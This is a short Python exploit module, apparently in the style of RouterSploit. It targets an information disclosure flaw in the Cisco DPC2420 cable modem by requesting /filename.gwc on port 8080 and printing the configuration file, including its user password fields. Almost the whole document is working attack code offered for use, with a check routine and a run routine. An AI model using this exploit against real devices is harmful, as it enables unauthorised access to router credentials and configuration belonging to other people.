# rsf exploit module
# description: Module exploits Cisco DPC2420 information disclosure vulnerability which allows reading sensitive information from the configuration file.

import requests

class Exploit:
    def __init__(self):
        self.target = ""
        self.port = 8080
        self.session = requests.Session()
        
    def run(self):
        try:
            response = self.session.get(
                f"http://{self.target}:{self.port}/filename.gwc",
                timeout=10
            )
            
            if response.status_code == 200 and "User Password" in response.text:
                print("[+] Exploit success - reading configuration file filename.gwc")
                print(response.text)
            else:
                print("[-] Exploit failed - could not read configuration file")
        except Exception as e:
            print(f"[-] Error: {str(e)}")
    
    def check(self):
        try:
            response = self.session.get(
                f"http://{self.target}:{self.port}/filename.gwc",
                timeout=10
            )
            
            if response.status_code == 200 and "User Password" in response.text:
                return True
            return False
        except:
            return False
